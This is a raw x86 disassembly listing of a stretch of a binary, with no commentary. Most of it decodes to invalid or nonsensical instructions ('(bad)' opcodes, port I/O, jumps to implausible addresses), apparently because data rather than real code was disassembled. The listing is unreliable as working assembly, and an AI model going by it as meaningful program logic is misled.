  414da1:	mov    esp,0x57ede043
  414da6:	push   es
  414da7:	pop    DWORD PTR [edi-0x5b]
  414daa:	lds    eax,FWORD PTR [ebp+0x12]
  414dad:	or     DWORD PTR [eax],eax
  414daf:	add    BYTE PTR [edx-0x3a],cl
  414db2:	inc    ebx
  414db3:	in     al,dx
  414db4:	dec    edx
  414db5:	add    eax,0x80850000
  414dba:	out    dx,al
  414dbb:	add    BYTE PTR [edx],bh
  414dbd:	add    eax,0xd107c700
  414dc2:	(bad)  
  414dc3:	inc    DWORD PTR [eax]
	...
  414dd1:	add    BYTE PTR [eax],al
  414dd3:	dec    edx
  414dd4:	add    eax,0x7952458d
  414dd9:	std    
  414dda:	jne    0x414e5a
  414ddc:	loope  0x414e0a
  414dde:	add    al,0xa
  414de0:	add    eax,0xa263c00b
  414de5:	jmp    0x5a74:0x41a8e82
  414dec:	pop    es
  414ded:	iret   
  414dee:	repz in al,dx
  414df0:	sub    DWORD PTR [edi],ebx
  414df2:	sub    DWORD PTR [edx+0x17443f2e],esp
  414df8:	add    al,BYTE PTR cs:[eax]
  414dfb:	arpl   WORD PTR [ebx-0x1],dx
  414dfe:	(bad)  
  414dff:	es jp  0x414e04
  414e02:	add    BYTE PTR [ebx+0x2e],ah
  414e05:	inc    edi
  414e06:	je     0x414dd7
  414e08:	dec    edi
  414e09:	in     eax,dx
  414e0a:	mov    ah,0x75
  414e0c:	in     eax,dx
  414e0d:	add    ecx,DWORD PTR [ebx]
  414e0f:	mov    ds:0xd8e7e9fa,eax
  414e14:	add    BYTE PTR [edi-0x2],0xe0
  414e18:	xor    DWORD PTR [ebp+0x22e222d],edx
  414e1e:	je     0x414e85
  414e20:	lahf   
  414e21:	in     eax,dx
  414e22:	lods   al,BYTE PTR ds:[esi]
  414e23:	inc    ebp
  414e24:	in     eax,dx
  414e25:	add    eax,edi
  414e27:	inc    di
  414e29:	sbb    DWORD PTR [ecx+0x63],eax
  414e2c:	sub    eax,0xabe30002
  414e31:	(bad)
  414e34:	inc    edx
  414e35:	sti    
  414e36:	inc    BYTE PTR [eax]
	...
  414e44:	add    BYTE PTR [eax],al
  414e46:	idiv   BYTE PTR [ecx-0x29988bb9]
  414e4c:	sub    eax,0x472e6302
  414e51:	je     0x414eaa
  414e53:	mov    BYTE PTR [ebx+0x0],0x63
  414e57:	cs inc esi
  414e59:	xor    ah,BYTE PTR [ebx]
  414e5b:	test   DWORD PTR [edi-0x2],eax
  414e5e:	cmp    al,0xff
  414e60:	push   esp
  414e61:	lods   eax,DWORD PTR ds:[esi]
  414e62:	jnp    0x414e93
  414e64:	test   DWORD PTR [ecx+eax*4-0x2701b811],0x39fd0204
  414e6f:	adc    BYTE PTR [eax+eiz*8+0x16],ah
  414e73:	inc    eax
  414e74:	adc    eax,0xe905638b
  414e79:	add    esp,DWORD PTR [esp+ebx*8-0x7368bbd1]
  414e80:	or     al,0x84
  414e82:	and    BYTE PTR [ecx-0x80],al
  414e85:	in     eax,dx
  414e86:	add    al,0xc5
  414e88:	call   0xaa47c0d8
  414e8d:	inc    edi
  414e8e:	dec    edx
  414e8f:	add    eax,0x56235d1
  414e94:	jmp    0xce3c1cf4
  414e99:	inc    edi
  414e9a:	mov    esp,0xbd47b999
  414e9f:	lods   al,BYTE PTR ds:[esi]
  414ea0:	arpl   WORD PTR [esi],dx
  414ea2:	and    al,BYTE PTR ds:0xc6788941
  414ea8:	call   0x414f08
	...
  414eb9:	push   edi
  414eba:	cld    
  414ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ebc:	inc    edi
  414ebd:	add    al,0x52
  414ebf:	into   
  414ec0:	les    edx,FWORD PTR [edi+eiz*4+0x52215e6]
  414ec7:	add    DWORD PTR [esi+0x4a],0xebdc8540
  414ece:	out    dx,al
  414ecf:	daa    
  414ed0:	add    al,0xb
  414ed2:	pop    eax
  414ed3:	(bad)  
  414ed4:	les    ebp,FWORD PTR [edi+eiz*1+0x7d]
  414ed8:	or     ah,BYTE PTR [edi+edi*1-0x30]
  414edc:	mov    esp,0xdbe8c48b
  414ee1:	mov    esp,ebp
  414ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee4:	add    edi,DWORD PTR [ebx]
  414ee6:	adc    al,BYTE PTR es:[edi+0x45]
  414eea:	scas   al,BYTE PTR es:[edi]
  414eeb:	ret    
  414eec:	adc    eax,0x71d105a2
  414ef1:	mov    ah,al
  414ef3:	(bad)  
  414ef4:	call   0x2e7aa481
  414ef9:	pushf  
  414efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414efb:	loope  0x414ece
  414efd:	daa    
  414efe:	aas    
  414eff:	dec    bx
  414f01:	ja     0x414ec7
  414f03:	inc    DWORD PTR [eax]
  414f05:	mov    eax,ds:0xa70efefc
  414f0a:	pop    es
  414f0b:	cli    
  414f0c:	push   es
  414f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0e:	es xor al,0x3
  414f11:	pushf  
  414f12:	aas    
  414f13:	or     ch,BYTE PTR [ecx]
  414f15:	adc    edx,DWORD PTR [eax+ebp*8]
  414f18:	fistp  WORD PTR [ecx+0xf2fe3f]
	...
  414f2a:	add    BYTE PTR [eax],al
  414f2c:	and    BYTE PTR [edx+0x7a63a609],dh
  414f32:	dec    edx
  414f33:	sub    BYTE PTR [edi+0x4],ah
  414f36:	add    cl,ch
  414f38:	pusha  
  414f39:	lods   eax,DWORD PTR ds:[esi]
  414f3a:	add    al,ch
  414f3c:	pusha  
  414f3d:	add    eax,0x3e50d6e8
  414f42:	dec    BYTE PTR [edx-0x16bf33e5]
  414f48:	gs leave 
  414f4a:	sti    
  414f4b:	call   0x6c4154b7
  414f50:	mov    ds:0x73964f3a,eax
  414f55:	inc    eax
  414f56:	dec    ecx
  414f57:	sub    BYTE PTR [edi+0x2d],bl
  414f5a:	push   0xb0560eb
  414f5f:	test   eax,0xbcff1993
  414f64:	sbb    ecx,esp
  414f66:	inc    eax
  414f67:	jmp    0x666fa774
  414f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f6d:	inc    edi
  414f6e:	add    al,0x5c
  414f70:	sbb    al,ch
  414f72:	(bad)  
  414f73:	call   0x414154d8
  414f78:	ds clc 
  414f7a:	inc    BYTE PTR [eax]
  414f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f7d:	fiadd  DWORD PTR [ebx+esi*1]
  414f80:	jne    0x414f49
  414f82:	push   si
  414f84:	pop    ebp
  414f85:	dec    eax
  414f86:	(bad)  
  414f87:	out    0x39,eax
  414f89:	sar    ebp,cl
  414f8b:	call   DWORD PTR [ebx-0x3d]
  414f8e:	push   ebx
  414f8f:	mov    eax,DWORD PTR [eax]
	...
  414f9d:	add    BYTE PTR [eax],al
  414f9f:	pop    dx
  414fa1:	add    eax,0xf801bae9
  414fa6:	jb     0x414fa3
  414fa8:	ret    0x6afd
  414fab:	or     bl,dl
  414fad:	mov    eax,0xb8020a01
  414fb2:	add    dl,bh
  414fb4:	add    DWORD PTR [eax],eax
  414fb6:	leave  
  414fb7:	cmp    BYTE PTR [esi],bh
  414fb9:	(bad)  
  414fba:	addr16 imul ebx,edx,0x3e
  414fbe:	add    dl,al
  414fc0:	push   edx
  414fc1:	inc    edx
  414fc3:	mov    ch,0x60
  414fc5:	clc    
  414fc6:	call   0xa4295945
  414fcb:	retf   
  414fcc:	add    DWORD PTR [eax],eax
  414fce:	call   0x3f16d3
  414fd3:	mov    ds:0xf5fff0bb,al
  414fd8:	loopne 0x414fec
  414fda:	cmc    
  414fdb:	(bad)
  414fde:	cld    
  414fdf:	out    dx,eax
  414fe0:	(bad)  
  414fe1:	std    
  414fe2:	xor    DWORD PTR [edi+0x7a41498c],0x1
  414fe9:	je     0x415004
  414feb:	or     DWORD PTR [esi],eax
  414fed:	lods   eax,DWORD PTR ds:[esi]
  414fee:	cs dec ebx
  414ff0:	or     DWORD PTR [eax],eax
  414ff2:	je     0x415070
  414ff4:	enter  0xad13,0xa4
  414ff8:	inc    edx
  414ff9:	inc    dh
  414ffb:	dec    edi
  414ffc:	sbb    ch,BYTE PTR [ecx]
  414ffe:	inc    ecx
  414fff:	dec    edx
  415000:	or     BYTE PTR [eax],al
	...
  415012:	arpl   WORD PTR [esi-0x33b739a5],bp
  415018:	inc    esp
  415019:	out    0x2b,eax
  41501b:	ret    
  41501c:	inc    esp
  41501d:	(bad)  
  41501e:	and    BYTE PTR [edi-0x34],dl
  415021:	call   0x718b7ec9
  415026:	(bad)  
  415027:	out    dx,eax
  415028:	inc    esp
  415029:	out    0x74,eax
  41502b:	sub    eax,0x21890002
  415030:	test   eax,0x531c312a
  415035:	or     BYTE PTR [ecx],0x23
  415038:	int    0x1
  41503a:	or     BYTE PTR [ecx],dh
  41503c:	push   edi
  41503d:	jmp    0x6ec:0xfe44a40b
  415044:	ins    BYTE PTR es:[edi],dx
  415045:	mul    ah
  415047:	sub    ebx,eax
  415049:	inc    esp
  41504b:	adc    al,BYTE PTR [ebx]
  41504d:	add    BYTE PTR [ebx+0x5b],ah
  415050:	sbb    eax,0x3ed2a48
  415055:	(bad)  
  415056:	jle    0x415072
  415058:	stos   DWORD PTR es:[edi],eax
  415059:	inc    eax
  41505a:	arpl   WORD PTR [ebx+0x1d],ax
  41505d:	push   eax
  41505e:	sbb    ch,ch
  415060:	add    edi,edi
  415062:	xchg   BYTE PTR [edx],bl
  415064:	stos   DWORD PTR es:[edi],eax
  415065:	inc    eax
  415066:	arpl   WORD PTR [ebx+0x1d],bp
  415069:	pop    eax
  41506a:	cmp    ch,ch
  41506c:	add    edi,edi
  41506e:	ds cli 
  415070:	stos   BYTE PTR es:[edi],al
  415071:	inc    eax
  415072:	arpl   WORD PTR [ebx+0x601d],dx
	...
  415084:	add    BYTE PTR [edx],ch
  415086:	in     eax,dx
  415087:	add    edi,edi
  415089:	inc    esi
  41508a:	or     ch,BYTE PTR [ebx+0x1dbb6340]
  415090:	push   0xff03ed0a
  415095:	cmp    ch,BYTE PTR ds:[ecx+0x66056340]
  41509c:	push   ds
  41509d:	rcr    esi,cl
  41509f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150a0:	add    ecx,DWORD PTR [edx+eiz*8-0x24]
  4150a4:	stos   BYTE PTR es:[edi],al
  4150a5:	mov    ds:0xbb1e4e05,eax
  4150aa:	fisub  WORD PTR [edi-0x431dcbfd]
  4150b0:	stos   BYTE PTR es:[edi],al
  4150b1:	mov    ds:0xe31e3605,eax
  4150b6:	frstor [edi+0x6ce21c03]
  4150bc:	stos   BYTE PTR es:[edi],al
  4150bd:	mov    ds:0xdb1e1e05,eax
  4150c2:	frstor [edi+0x5ce20403]
  4150c8:	stos   BYTE PTR es:[edi],al
  4150c9:	mov    ds:0xd31e0605,eax
  4150ce:	frstor [edi+0x5ce1ec03]
  4150d4:	stos   BYTE PTR es:[edi],al
  4150d5:	mov    ds:0xfb1dee05,eax
  4150da:	frstor [edi]
  4150dc:	add    al,0xd4
  4150de:	loope  0x41515c
  4150e0:	frstor [ebx]
  4150e2:	add    eax,0xdde4e9d6
  4150e7:	daa    
  4150e8:	add    al,0x0
	...
  4150f6:	add    BYTE PTR [eax],al
  4150f8:	mov    esp,0x23dd8ce1
  4150fd:	add    eax,0xde04e9be
  415102:	daa    
  415103:	add    al,0xa4
  415105:	loope  0x415183
  415107:	frstor [ebx]
  415109:	add    eax,0xddc4e9a6
  41510e:	daa    
  41510f:	add    al,0x8c
  415111:	loope  0x41516f
  415113:	frstor [ebx]
  415115:	add    eax,0xddb4e98e
  41511a:	daa    
  41511b:	add    al,0x74
  41511d:	loope  0x41515b
  41511f:	frstor [ebx]
  415121:	add    eax,0x7b7a7600
  415126:	pop    eax
  415127:	sub    BYTE PTR [edi+0x3a],ah
  41512a:	and    al,0x2d
  41512c:	ss (bad) 
  41512e:	call   FWORD PTR [ebp+0x3a]
  415131:	inc    ebx
  415132:	pop    eax
  415133:	test   al,0x60
  415135:	cmp    ah,BYTE PTR [ebx*1+0x45ffc61e]
  41513c:	dec    edx
  41513d:	dec    ebx
  41513e:	pop    eax
  41513f:	test   al,0x60
  415141:	cmp    ah,BYTE PTR [ebx*1+0x2dffc606]
  415148:	or     dl,BYTE PTR [ebx+0x58]
  41514b:	test   al,0x60
  41514d:	cmp    ah,BYTE PTR [edi*1+0x15ffc62e]
  415154:	cli    
  415155:	pop    edx
  415156:	pop    eax
  415157:	test   al,0x60
  415159:	cmp    ah,BYTE PTR [ecx*1+0x0]
	...
  415168:	add    BYTE PTR [eax],al
  41516a:	add    BYTE PTR [esi],dl
  41516c:	(bad)  
  41516d:	(bad)  
  41516e:	std    
  41516f:	sti    
  415170:	and    bl,BYTE PTR [eax-0x58]
  415173:	pusha  
  415174:	cmp    ah,BYTE PTR [edi*8-0x1a003a41]
  41517b:	retf   
  41517c:	sub    bl,BYTE PTR [eax+0x28]
  41517f:	cmp    ah,BYTE PTR [si]
  415182:	frstor [edi-0x3432003b]
  415188:	xor    bl,BYTE PTR [eax+0x28]
  41518b:	pop    edi
  41518c:	cmp    ah,BYTE PTR [edi*4-0x4a003a71]
  415193:	mov    ebx,0x6728583a
  415198:	cmp    ah,BYTE PTR [ebp*8-0x62003a4a]
  41519f:	jnp    0x4151a3
  4151a1:	pop    edx
  4151a2:	sub    BYTE PTR [edi+0x3a],bl
  4151a5:	and    al,0xdd
  4151a7:	sahf   
  4151a8:	(bad)  
  4151ab:	(bad)  ds:0x13b5a0e
  4151b1:	jmp    DWORD PTR ds:0x3f5886
  4151b7:	int    0x2d
  4151b9:	sbb    bl,BYTE PTR [edx+0xb]
  4151bc:	push   es
  4151bd:	jmp    DWORD PTR ds:0x3f5b5a
  4151c3:	lods   eax,DWORD PTR ds:[esi]
  4151c4:	sub    eax,0x60b5a22
  4151c9:	jmp    DWORD PTR ds:0x3f5b52
	...
  4151db:	add    BYTE PTR [eax],al
  4151dd:	add    BYTE PTR [ebp+0x2d],ch
  4151e0:	sub    bl,BYTE PTR [edx-0x5]
  4151e3:	add    eax,0x581a25ff
  4151e8:	aas    
  4151e9:	add    BYTE PTR ds:0xbb5a362d,bh
  4151ef:	add    eax,0x57ba25ff
  4151f4:	aas    
  4151f5:	add    BYTE PTR [ebp+0x2d],ch
  4151f8:	inc    edx
  4151f9:	pop    edx
  4151fa:	retf   
  4151fb:	add    eax,0x57b225ff
  415200:	aas    
  415201:	add    ch,ch
  415203:	and    DWORD PTR [edx+0x5a],ecx
  415206:	or     eax,DWORD PTR [esi]
  415208:	jmp    DWORD PTR ds:0x3f5b9a
  41520e:	lods   eax,DWORD PTR ds:[esi]
  41520f:	and    DWORD PTR [edx+0x5a],edx
  415212:	jnp    0x415215
  415214:	jmp    DWORD PTR ds:0x3f5b72
  41521a:	popf   
  41521b:	and    DWORD PTR [edx+0x5a],ebx
  41521e:	jnp    0x415221
  415220:	jmp    DWORD PTR ds:0x3f5b1a
  415226:	int    0x21
  415228:	bound  ebx,QWORD PTR [edx+0x4b]
  41522b:	add    edi,edi
  41522d:	and    eax,0x3f5b5e
  415232:	arpl   WORD PTR [ebx-0x12e68c1a],dx
  415238:	add    edi,edi
  41523a:	ds add al,0xde
  41523d:	inc    eax
  41523e:	arpl   WORD PTR [ebx+0x7fe6],di
	...
  415250:	add    BYTE PTR [ecx],cl
  415252:	in     eax,dx
  415253:	add    edi,edi
  415255:	xchg   BYTE PTR [edx-0x609cbf23],ah
  41525b:	out    0x87,al
  41525d:	test   eax,0x7eff026d
  415262:	mov    ds:0xc76340dd,al
  415267:	out    0x8f,al
  415269:	cdq    
  41526a:	ins    DWORD PTR es:[edi],dx
  41526b:	add    bh,bh
  41526d:	xchg   dl,dl
  41526f:	fld    QWORD PTR [eax+0x63]
  415272:	out    dx,eax
  415273:	out    0x9b,al
  415275:	mov    ecx,0x3eff026d
  41527a:	into   
  41527b:	fld    QWORD PTR [eax+0x63]
  41527e:	pop    ss
  41527f:	out    0xa3,eax
  415281:	test   eax,0x46ff026d
  415286:	(bad)  
  415287:	fld    QWORD PTR [eax+0x63]
  41528a:	jmp    esi
  41528c:	stos   DWORD PTR es:[edi],eax
  41528d:	mov    DWORD PTR [ebp+0x2],ebp
  415290:	(bad)  
  415291:	ds (bad) 
  415293:	fld    QWORD PTR [eax+0x63]
  415296:	daa    
  415297:	in     eax,0xb3
  415299:	cmp    ebp,ebp
  41529b:	add    edi,edi
  41529d:	xchg   BYTE PTR [esi-0x24],ah
  4152a0:	inc    eax
  4152a1:	arpl   WORD PTR [edi-0x1b],cx
  4152a4:	mov    ebx,0xff03ed19
  4152a9:	jle    0x415319
  4152ab:	fadd   QWORD PTR [eax+0x63]
  4152ae:	ja     0x415295
  4152b0:	(bad)  
  4152b1:	or     ebp,ebp
  4152b3:	add    edi,edi
	...
  4152c1:	add    BYTE PTR [eax],al
  4152c3:	add    BYTE PTR [esi-0x66],al
  4152c6:	fadd   QWORD PTR [eax+0x63]
  4152c9:	add    eax,0x49984fb5
  4152ce:	lods   al,BYTE PTR ds:[esi]
  4152cf:	dec    edi
  4152d0:	cwde   
  4152d1:	dec    ecx
  4152d2:	popa   
  4152d3:	mov    DWORD PTR [eax+0x1],0xba623b6a
  4152da:	lock jnp 0x4152dd
  4152dd:	add    eax,0x1a103e9
  4152e2:	jmp    0xec42a76b
  4152e7:	or     ebx,DWORD PTR [ebx]
  4152e9:	add    ebp,ecx
  4152eb:	add    esp,DWORD PTR [ebx+0x43]
  4152ee:	in     al,0x3
  4152f0:	loopne 0x41532e
  4152f2:	loopne 0x4152b2
  4152f4:	fs jge 0x4152db
  4152f7:	add    esp,DWORD PTR [ebx+0x5]
  4152fa:	sub    eax,DWORD PTR [edi]
  4152fc:	arpl   WORD PTR [eax+eax*2+0x710da613],ax
  415303:	or     DWORD PTR [ebx+0x5],esp
  415306:	jmp    0x6a46b350
  41530b:	cmp    ebp,DWORD PTR [edx+edi*4-0x10]
  41530f:	jnp    0x41536d
  415311:	add    eax,0x12103e9
  415316:	jmp    0x84063f9f
  41531b:	or     ebp,DWORD PTR [ebx+0x6303e90a]
  415321:	inc    ebx
  415322:	in     al,dx
  415323:	add    ebx,DWORD PTR [esi+0x3e885]
	...
  415335:	add    BYTE PTR [eax],al
  415337:	arpl   WORD PTR [edx+0x5587bf0],di
  41533d:	jmp    0xe941f445
  415342:	add    BYTE PTR [ebx+0x6],ah
  415345:	jmp    0x814e894d
  41534a:	push   cs
  41534b:	arpl   WORD PTR ds:0x56041e9,ax
  415351:	add    ah,dh
  415353:	pusha  
  415354:	add    eax,DWORD PTR [eax]
  415356:	jmp    0xf9f952fe
  41535b:	pusha  
  41535c:	add    eax,0x55bab00
  415361:	cmp    eax,0x564e9
  415366:	or     al,0x67
  415368:	jge    0x41537b
  41536a:	jmp    0xe60358cf
  41536f:	pusha  
  415370:	cli    
  415371:	jmp    eax
  415373:	pusha  
  415374:	add    eax,0x12d8e17d
  415379:	add    cl,ch
  41537b:	pusha  
  41537c:	inc    ebx
  41537d:	add    ebp,ecx
  41537f:	arpl   WORD PTR ds:0xb860e910,ax
  415385:	pop    es
  415386:	xchg   ecx,eax
  415387:	dec    ebp
  415388:	add    eax,0x2a2e900
  41538d:	add    ah,bh
  41538f:	pusha  
  415390:	in     eax,0xff
  415392:	call   0xd1f952ba
  415397:	pusha  
  415398:	add    eax,0x2b00
	...
  4153a9:	add    BYTE PTR [ebx+0x5],bl
  4153ac:	cmp    eax,0xfe3720e9
  4153b1:	xchg   esp,eax
  4153b2:	push   0x60e9197d
  4153b7:	add    eax,0xf860edc2
  4153bc:	jmp    FWORD PTR [eax+0x5f]
  4153bf:	add    eax,0x1a58e17d
  4153c4:	add    cl,ch
  4153c6:	pusha  
  4153c7:	inc    ebx
  4153c8:	add    ebp,ecx
  4153ca:	ror    DWORD PTR [ebp+0x3c],1
  4153cd:	jmp    0xe6415832
  4153d2:	add    eax,DWORD PTR [esi-0x74]
  4153d5:	sbb    eax,0x8b1766
  4153da:	sti    
  4153db:	les    eax,FWORD PTR [edx]
  4153dd:	add    BYTE PTR [ecx],bh
  4153df:	sbb    DWORD PTR [edx],0xff028a04
  4153e5:	jne    0x41538e
  4153e7:	mov    edi,DWORD PTR [edi+0x10]
  4153ea:	jle    0x4153ee
  4153ec:	add    BYTE PTR [ecx+0x419fb],cl
  4153f2:	mov    al,BYTE PTR [edx-0x3b]
  4153f5:	add    DWORD PTR [esi+0x72fffffe],0xf3000002
  4153ff:	or     BYTE PTR [esi],0x4
  415402:	dec    edx
  415403:	add    al,BYTE PTR [ebx-0x1e184]
  415409:	mov    dl,bl
  41540b:	sbb    al,BYTE PTR [eax+eax*1]
	...
  41541a:	add    BYTE PTR [eax],al
  41541c:	add    BYTE PTR [edx],bh
  41541e:	outs   dx,BYTE PTR ds:[esi]
  41541f:	or     DWORD PTR [edx-0x13ffbb5],ecx
  415425:	mov    cl,BYTE PTR [edx+0x23ec1ff]
  41542b:	shl    BYTE PTR [ecx],1
  41542d:	js     0x41542d
  41542f:	inc    DWORD PTR [edx+0x4168b]
  415435:	or     dh,bh
  415437:	jae    0x415456
  415439:	xchg   ecx,eax
  41543a:	or     DWORD PTR [esi],0x8901fa04
  415440:	xor    edx,0xcafffffd
  415446:	mov    esi,0x1fe1c7f
  41544b:	add    BYTE PTR [eax],cl
  41544d:	cli    
  41544e:	add    DWORD PTR [eax],eax
  415450:	mov    DWORD PTR [ebx+0x12],ecx
  415453:	add    al,0x0
  415455:	retf   0x878a
  415458:	sbb    BYTE PTR [esi+0x5bd00001],bh
  41545e:	les    eax,FWORD PTR [ecx+0x6306381]
  415464:	add    BYTE PTR [ebx+0x47],ah
  415467:	mov    dh,0x1c
  415469:	fsubr  DWORD PTR [ebx+edx*1-0x76d39cfc]
  415470:	cmp    BYTE PTR [ebx+0x28],0x2
  415474:	add    BYTE PTR [ebx],ah
  415476:	pop    edi
  415477:	sbb    BYTE PTR [ebx],0x67
  41547a:	sub    al,0x2
  41547c:	or     BYTE PTR [ebx+0x2c],ah
  41547f:	add    cl,BYTE PTR [ecx+0x0]
	...
  41548d:	add    BYTE PTR [eax],al
  41548f:	add    dl,ah
  415491:	cmp    eax,DWORD PTR [esi]
  415493:	add    BYTE PTR [ebx-0x5d],ah
  415496:	mov    dl,BYTE PTR [edi]
  415498:	addr16 sub al,0x2
  41549b:	mov    ah,BYTE PTR [edx+0x2a]
  41549e:	inc    edx
  41549f:	std    
  4154a0:	and    esp,DWORD PTR [edi-0x15173cfe]
  4154a6:	out    0x3,eax
  4154a8:	fdiv   DWORD PTR [edx-0x1a]
  4154ab:	add    ebp,DWORD PTR [esi+0x3532d37c]
  4154b1:	stos   BYTE PTR es:[edi],al
  4154b2:	retf   0xe9ff
  4154b5:	(bad)  
  4154b6:	and    dh,0x62
  4154b9:	or     eax,0x5ad6452c
  4154be:	rol    DWORD PTR [edx-0x104ce1e5],cl
  4154c4:	loopne 0x4154ba
  4154c6:	add    bh,BYTE PTR [ebp-0x1c313f4]
  4154cc:	(bad)  
  4154cd:	xchg   ecx,eax
  4154ce:	or     DWORD PTR [ecx+esi*2+0x6f],esi
  4154d2:	xchg   esi,edi
  4154d4:	(bad)  
  4154d5:	lds    ebx,FWORD PTR [edi]
  4154d7:	add    al,0x63
  4154d9:	push   ds
  4154da:	mov    ch,0x18
  4154dc:	fcomp  DWORD PTR [ebp+0x1e630413]
  4154e2:	mov    DWORD PTR [eax+0x22a7b],eax
  4154e8:	and    eax,DWORD PTR ds:0x9687a70
  4154ee:	jmp    0xf8c83ef6
  4154f3:	pop    es
	...
  415500:	add    BYTE PTR [eax],al
  415502:	add    BYTE PTR [ebx+0x5],ah
  415505:	bound  eax,QWORD PTR [edx+0x3e90954]
  41550b:	lods   eax,DWORD PTR ds:[esi]
  41550c:	inc    edi
  41550d:	out    0xb7,eax
  41550f:	push   0x7f
  415511:	rol    BYTE PTR [ecx],1
  415513:	mov    eax,0x748ba933
  415518:	and    dl,ch
  41551a:	push   ebx
  41551b:	fs push es
  41551d:	push   eax
  41551e:	pop    ds
  41551f:	addr16 add eax,0x805bb6e9
  415525:	adc    esp,DWORD PTR [bx+0x5]
  415529:	jmp    0xe54f38b8
  41552e:	add    esp,DWORD PTR [ebx-0x3b]
  415531:	pop    edi
  415532:	jp     0x4155ac
  415534:	or     ecx,ebp
  415536:	add    ebx,edx
  415538:	test   eax,edi
  41553a:	pop    es
  41553b:	arpl   WORD PTR ds:0x9548272,ax
  415541:	jmp    0xeb4e3e49
  415546:	pop    eax
  415547:	cs dec eax
  415549:	pop    ss
  41554a:	sub    ecx,esp
  41554c:	and    ah,bh
  41554e:	mov    esi,DWORD PTR [edx+edi*4+0x5a]
  415552:	fsub   DWORD PTR [ebx+0x5e]
  415555:	int3   
  415556:	pop    es
  415557:	arpl   WORD PTR ds:0x85d81a9c,ax
  41555d:	clc    
  41555e:	pop    es
  41555f:	arpl   WORD PTR ds:0x94c8260,ax
  415565:	jmp    0x41556d
	...
  415576:	mov    ds:0x5f1f3f7e,eax
  41557b:	add    eax,0x14e38ae9
  415580:	add    ch,ch
  415582:	pusha  
  415583:	add    eax,0x968688b
  415588:	add    cl,ch
  41558a:	xchg   edx,eax
  41558b:	inc    esi
  41558c:	add    BYTE PTR [ebp+0x6d],dl
  41558f:	jg     0x4155a0
  415591:	jmp    0x4155a1
  415593:	xor    al,cl
  415595:	popa   
  415596:	push   edi
  415597:	and    BYTE PTR [ecx],al
  415599:	cdq    
  41559a:	mov    edi,0x9cdda904
  41559f:	xor    edi,esi
  4155a1:	cmp    al,0x76
  4155a3:	add    BYTE PTR [eax-0x1cc7327],0x70
  4155aa:	ficomp WORD PTR [ebx]
  4155ac:	add    al,0xe9
  4155ae:	pusha  
  4155af:	lds    ecx,FWORD PTR [eax+0x95b50]
  4155b5:	jmp    0xed50da99
  4155ba:	pusha  
  4155bb:	add    eax,0x97f708b
  4155c0:	add    cl,ch
  4155c2:	mov    al,0xe5
  4155c4:	pop    esi
  4155c5:	cvtpi2ps xmm0,QWORD PTR [ebp+0x3]
  4155c9:	jmp    0xcdcc2ffb
  4155ce:	sbb    al,0x3
  4155d0:	push   esi
  4155d1:	sbb    bl,BYTE PTR [edi+0x584c82db]
  4155d7:	mov    ebx,0x8404
	...
  4155e8:	add    BYTE PTR [eax+0x5],bl
  4155eb:	add    cl,ch
  4155ed:	in     eax,dx
  4155ee:	scas   al,BYTE PTR es:[edi]
  4155ef:	and    ebx,ebp
  4155f1:	in     eax,0x3b
  4155f3:	sub    dh,BYTE PTR [edx+ebx*8]
  4155f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155f7:	and    ebp,ecx
  4155f9:	(bad)  
  4155fa:	adc    eax,DWORD PTR [edx+eax*2+0x248b12b3]
  415601:	in     al,0x58
  415603:	mov    WORD PTR [edx+0x67],?
  415606:	add    eax,0x30fa0000
  41560b:	sbb    BYTE PTR [esp+eax*8+0x41],dh
  41560f:	inc    eax
  415610:	test   DWORD PTR [ebx+0x7a83f474],eax
  415616:	push   es
  415617:	test   ecx,ecx
  415619:	daa    
  41561a:	add    DWORD PTR [ebx+0x1e3c8c0],eax
  415620:	or     DWORD PTR [edx],0x8
  415623:	inc    edi
  415624:	inc    esi
  415625:	cmp    DWORD PTR [edx+0x22],ebp
  415628:	sbb    al,0xbb
  41562a:	jne    0x4155f8
  41562c:	pop    edi
  41562d:	jl     0x41567b
  41562f:	pop    ecx
  415630:	ret    0x67e
  415633:	mov    edx,DWORD PTR [esi+eiz*2+0x5]
  415637:	push   ebp
  415638:	push   esi
  415639:	adc    ecx,edi
  41563b:	lds    eax,FWORD PTR [esi-0x1cd6e]
  415641:	mov    al,BYTE PTR [esi]
  415643:	add    BYTE PTR [eax],al
  415645:	add    BYTE PTR [eax],al
  415647:	test   cl,cl
  415649:	ins    DWORD PTR es:[edi],dx
  41564a:	mov    dl,0x2e
  41564c:	add    DWORD PTR [eax],eax
	...
  41565a:	add    BYTE PTR [eax],al
  41565c:	dec    edx
  41565d:	push   es
  41565e:	push   edi
  41565f:	mov    ecx,DWORD PTR [esi+0x52]
  415662:	adc    al,BYTE PTR [ebx+0x575ffbd]
  415668:	std    
  415669:	(bad)  
  41566a:	(bad)  
  41566b:	dec    DWORD PTR [edx-0x7d]
  41566e:	shr    BYTE PTR [ebx],0x85
  415671:	xchg   esi,eax
  415672:	cmp    BYTE PTR [eax],cl
  415674:	push   ss
  415675:	inc    eax
  415676:	dec    ebp
  415677:	inc    eax
  415678:	mov    bh,0xef
  41567a:	jae    0x415672
  41567c:	mov    DWORD PTR [edx+ebx*1-0xf9f5fc],eax
  415683:	jne    0x4156a4
  415685:	add    DWORD PTR [eax+edx*1-0x76fffa0a],0xffffff84
  41568d:	push   cs
  41568e:	add    al,0x0
  415690:	arpl   WORD PTR [edx+eax*8],bx
  415693:	(bad)  
  415694:	in     eax,0x1f
  415696:	(bad)  
  415697:	jmp    esp
  415699:	xor    eax,DWORD PTR [edx]
  41569b:	add    BYTE PTR [ebx-0x4b],ah
  41569e:	or     BYTE PTR [edi],0x5f
  4156a1:	sbb    al,0x2
  4156a3:	mov    esp,ebp
  4156a5:	push   ebx
  4156a6:	(bad)  
  4156a7:	inc    esp
  4156a9:	imul   esp,ebx,0xffffff8a
  4156ac:	in     eax,0x2b
  4156ae:	(bad)  
  4156af:	push   DWORD PTR [ebp+eiz*4+0x23db5f0d]
  4156b6:	aaa    
  4156b7:	test   DWORD PTR [ebx+0x20],edx
  4156ba:	add    al,BYTE PTR [eax]
  4156bc:	cmp    eax,0x74611
	...
  4156cd:	add    BYTE PTR [eax],al
